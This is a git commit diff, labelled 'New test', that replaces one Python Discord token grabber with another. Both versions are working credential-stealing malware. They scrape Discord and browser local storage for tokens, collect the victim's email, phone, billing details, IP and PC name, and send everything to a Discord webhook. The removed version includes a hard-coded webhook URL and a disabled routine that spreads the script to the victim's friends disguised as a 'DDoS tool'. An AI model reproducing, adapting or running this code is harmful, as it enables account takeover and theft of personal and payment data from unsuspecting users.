d81e340a16638f8f578250b8135abbc71d19e66a
TestBuycraft <153559225+zLTown@users.noreply.github.com>
2025-12-12 20:02:17 +0100

    New test

--- grabbers/token_grabber.py
+++ grabbers/token_grabber.py
@@ -1,213 +1,226 @@
 import os
-
-if os.name != "nt":
-    exit()
+import ssl
+from getpass import getuser
+from json import dumps, loads
+from platform import node as get_pc_name
 from re import findall
-from json import loads, dumps
-from base64 import b64decode
-from subprocess import Popen, PIPE
+from sys import platform as OS
+from typing import List, Optional
 from urllib.request import Request, urlopen
-from threading import Thread
-from time import sleep
-from sys import argv
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1449065508405117002/uCNz_YMxfK0FqtaqEUzISnMoEHzjBX_Fj7Mt33YjIQrP0-zzHjxrXrIIiCU_Hz5s-QjT" # Insert webhook url here
-
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
-PATHS = {
-    "Discord": ROAMING + "\\Discord",
-    "Discord Canary": ROAMING + "\\discordcanary",
-    "Discord PTB": ROAMING + "\\discordptb",
-    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
-    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
-    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
-}
+# Constants
+WEBHOOK = "{WEBHOOK}"
+IPIFY_API_URL = "https://api.ipify.org?format=json"
+DISCORD_API_URL = "https://discordapp.com/api/v6/users/@me"
+DISCORD_AVATAR_URL = "https://cdn.discordapp.com/avatars/{id}/{avatar_id}"
+DISCORD_BILLING_URL = DISCORD_API_URL + "/billing/payment-sources"
+USER_AGENT = (
+    "Mozilla/5.0 (X11; Linux x86_64) "
+    "AppleWebKit/537.11 (KHTML, like Gecko) "
+    "Chrome/23.0.1271.64 Safari/537.11"
+)
+CONTENT_TYPE = "application/json"
 
 
-def getHeader(token=None, content_type="application/json"):
-    headers = {
-        "Content-Type": content_type,
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
+ssl._create_default_https_context = ssl._create_unverified_context
+
+
+def pc_info():
+
+    api_resp = open_url(IPIFY_API_URL)
+    return (
+        f'IP: {api_resp.get("ip") if api_resp else None}\n'
+        f"Username: {getuser()}\n"
+        f"PC Name: {get_pc_name()}\n"
+    )
+
+
+def get_paths() -> dict:
+
+    if OS == "win32":  # Windows
+        local_app_data = os.getenv("LOCALAPPDATA")
+        app_data = os.getenv("APPDATA")
+        chromium_path = ["User Data", "Default"]
+
+    if OS == "darwin":  # OSX
+        local_app_data = os.path.expanduser("~/Library/Application Support")
+        app_data = os.path.expanduser("~/Library/Application Support")
+        chromium_path = ["Default"]
+
+    paths = {
+        "Discord": [app_data, "Discord"],
+        "Discord Canary": [app_data, "discordcanary"],
+        "Discord PTB": [app_data, "discordptb"],
+        "Google Chrome": [local_app_data, "Google", "Chrome", *chromium_path],
+        "Brave": [local_app_data, "BraveSoftware", "Brave-Browser", *chromium_path],
+        "Yandex": [local_app_data, "Yandex", "YandexBrowser", *chromium_path],
+        "Opera": [app_data, "Opera Software", "Opera Stable"],
     }
+
+    for app_name, path in paths.items():
+        paths[app_name] = os.path.join(*path, "Local Storage", "leveldb")
+
+    return paths
+
+
+def open_url(url: str,
+             token: Optional[str] = None,
+             data: Optional[bytes] = None) -> Optional[dict]:
+
+    headers = {
+        "Content-Type": CONTENT_TYPE,
+        "User-Agent": USER_AGENT,
+    }
+
     if token:
         headers.update({"Authorization": token})
-    return headers
-
-
-def getUserData(token):
     try:
-        return loads(
-            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
-    except:
+        result = urlopen(Request(url, data, headers)).read().decode().strip()
+        if result:
+            return loads(result)
+    except Exception:
         pass
 
 
-def getTokenz(path):
-    path += "\\Local Storage\\leveldb"
+class Account:
+
+    def __init__(self, token: str, token_location: str):
+        self.token = token
+        self.token_location = token_location
+        self.account_data = open_url(DISCORD_API_URL, self.token)
+        self.billing_data = open_url(DISCORD_BILLING_URL, self.token)
+
+        if self.account_data:
+            self.name = self.account_data.get("username")
+            self.discriminator = self.account_data.get("discriminator")
+            self.id = self.account_data.get("id")
+            self.avatar_url = DISCORD_AVATAR_URL.format(
+                id=self.id, avatar_id=self.account_data.get('avatar')
+            )
+
+    def account_info(self) -> str:
+
+        if not self.account_data:
+            return "None"
+
+        return (
+            f"Email: {str(self.account_data.get('email'))}\n"
+            f"Phone: {str(self.account_data.get('phone'))}\n"
+            f"Nitro: {'Enabled' if bool(self.account_data.get('premium_type')) else 'Disabled'}\n"
+            f"MFA: {'Enabled' if bool(self.account_data.get('mfa_enabled')) else 'Disabled'}\n"
+            f"Lang: {str(self.account_data.get('locale')).capitalize()}"
+        )
+
+    def billing_info(self) -> List[str]:
+
+        if not self.billing_data:
+            return "None"
+
+        info = []
+
+        for bill in self.billing_data:
+            info.append(
+                f"Id: {str(bill.get('id'))}\n"
+                f"Owner: {str(bill.get('billing_address').get('name').title())}\n"
+                f"Postal Code: {str(bill.get('billing_address').get('postal_code'))}\n"
+                f"Invalid: {str(bill.get('invalid'))}\n"
+                f"Brand: {str(bill.get('brand')).capitalize()}\n"
+                f"Last digits: {str(bill.get('last_4'))}\n"
+                f"Expires: {str(bill.get('expires_month'))}"
+                f"/{str(bill.get('expires_year'))}\n"
+                f"Country: {str(bill.get('country'))}"
+            )
+        return info
+
+
+def field(title: str, text: str, inline: bool = True) -> str:
+
+    return {
+        "name": f"**{title} Info**",
+        "value": str(text),
+        "inline": bool(inline)
+    }
+
+
+def embed_info(accounts: List[Account]) -> List[dict]:
+
+    embeds = []
+    for account in accounts.values():
+        fields = [
+            field("Account", account.account_info()),
+            field("PC", pc_info()),
+            field("Token", account.token, False)
+        ]
+
+        if account.billing_data:
+            fields.insert(-1, field("Billing", account.billing_info()[0]))
+
+        embeds.append({
+            "color": 0x6A5ACD,
+            "fields": fields,
+            "footer": {"text": "Made by @3ct0s and @JM1k1"},
+            "author": {
+                "name": (
+                    f"{account.name}#{account.discriminator} "
+                    f"({account.id})"
+                ),
+                "icon_url": account.avatar_url
+            }
+        })
+    return embeds
+
+
+def send_webhook(embeds: List[dict], WEBHOOK_URL: str):
+
+    webhook = {
+        "content": "",
+        "embeds": embeds,
+        "username": "Eclipse Grabber",
+        "avatar_url": "https://imgur.com/Ymo8GEe.png"
+    }
+
+    data = dumps(webhook).encode()
+    return open_url(WEBHOOK_URL, None, data)
+
+
+def get_tokens(path: str) -> List[str]:
+
     tokens = []
+
     for file_name in os.listdir(path):
         if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
             continue
-        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+        content = open(os.path.join(path, file_name), errors="ignore")
+
+        for line in map(str.strip, content.readlines()):
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
+                          r"mfa\.[\w-]{84}"):
                 for token in findall(regex, line):
                     tokens.append(token)
     return tokens
 
 
-def whoTheFuckAmI():
-    ip = "None"
-    try:
-        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
-    except:
-        pass
-    return ip
+def get_accounts(paths: dict) -> dict:
 
+    accounts = {}
 
-def hWiD():
-    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-
-
-def getFriends(token):
-    try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
-                                     headers=getHeader(token))).read().decode())
-    except:
-        pass
-
-
-def getChat(token, uid):
-    try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
-                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
-    except:
-        pass
-
-
-def paymentMethods(token):
-    try:
-        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
-                                              headers=getHeader(token))).read().decode())) > 0)
-    except:
-        pass
-
-
-def sendMessages(token, chat_id, form_data):
-    try:
-        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
-                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
-                        data=form_data.encode())).read().decode()
-    except:
-        pass
-
-
-def spread(token, form_data, delay):
-    return  # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.)
-    for friend in getFriends(token):
-        try:
-            chat_id = getChat(token, friend["id"])
-            sendMessages(token, chat_id, form_data)
-        except Exception as e:
-            pass
-        sleep(delay)
-
-
-def main():
-    cache_path = ROAMING + "\\.cache~$"
-    prevent_spam = True
-    self_spread = True
-    embeds = []
-    working = []
-    checked = []
-    already_cached_tokens = []
-    working_ids = []
-    ip = whoTheFuckAmI()
-    pc_username = os.getenv("UserName")
-    pc_name = os.getenv("COMPUTERNAME")
-    user_path_name = os.getenv("userprofile").split("\\")[2]
-    for platform, path in PATHS.items():
+    for app_name, path in paths.items():
         if not os.path.exists(path):
             continue
-        for token in getTokenz(path):
-            if token in checked:
-                continue
-            checked.append(token)
-            uid = None
-            if not token.startswith("mfa."):
-                try:
-                    uid = b64decode(token.split(".")[0].encode()).decode()
-                except:
-                    pass
-                if not uid or uid in working_ids:
-                    continue
-            user_data = getUserData(token)
-            if not user_data:
-                continue
-            working_ids.append(uid)
-            working.append(token)
-            username = user_data["username"] + "#" + str(user_data["discriminator"])
-            user_id = user_data["id"]
-            email = user_data.get("email")
-            phone = user_data.get("phone")
-            nitro = bool(user_data.get("premium_type"))
-            billing = bool(paymentMethods(token))
-            embed = {
-                "color": 0x7289da,
-                "fields": [
-                    {
-                        "name": "|Account Info|",
-                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
-                        "inline": True
-                    },
-                    {
-                        "name": "|PC Info|",
-                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
-                        "inline": True
-                    },
-                    {
-                        "name": "|Token|",
-                        "value": token,
-                        "inline": False
-                    }
-                ],
-                "author": {
-                    "name": f"{username} ({user_id})",
-                },
-                "footer": {
-                    "text": f"Visit my website for more Cybersecurity contents: un5t48l3.com"
-                }
-            }
-            embeds.append(embed)
-    with open(cache_path, "a") as file:
-        for token in checked:
-            if not token in already_cached_tokens:
-                file.write(token + "\n")
-    if len(working) == 0:
-        working.append('123')
-    webhook = {
-        "content": "",
-        "embeds": embeds,
-        "username": "Discord Token Grabber",
-        "avatar_url": "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png"
-    }
-    try:
-        
-        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
-    except:
-        pass
-    if self_spread:
-        for token in working:
-            with open(argv[0], encoding="utf-8") as file:
-                content = file.read()
-            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
-            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
+        for token in get_tokens(path):
+            account = Account(token, app_name)
+            if account.account_data and account.id not in accounts.keys():
+                accounts.update({account.id: account})
+    return accounts
 
 
-try:
-    main()
-except Exception as e:
-    print(e)
-    pass
+def main(WEBHOOK_URL: str):
+
+    paths = get_paths()
+    accounts = get_accounts(paths)
+    embeds = embed_info(accounts)
+    send_webhook(embeds, WEBHOOK_URL)
+
+
+if __name__ == "__main__":
+    main(WEBHOOK) # Run the main function
